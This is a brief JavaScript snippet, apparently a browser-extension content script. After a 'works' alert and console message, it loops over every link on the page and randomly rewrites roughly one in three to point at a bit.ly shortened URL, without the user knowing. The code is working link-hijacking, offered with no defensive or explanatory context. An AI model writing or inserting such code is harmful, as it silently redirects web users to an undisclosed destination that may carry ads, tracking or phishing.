alert("works")
console.log("extension works!");
var a = document.getElementsByTagName("a");
for (var i = 0; i < a.length; i++) {
	var random = Math.floor((Math.random() * 3) + 1);
	if (random == 2) {
		a[i].href = "http://bit.ly/30QqsQ2";
	}
}
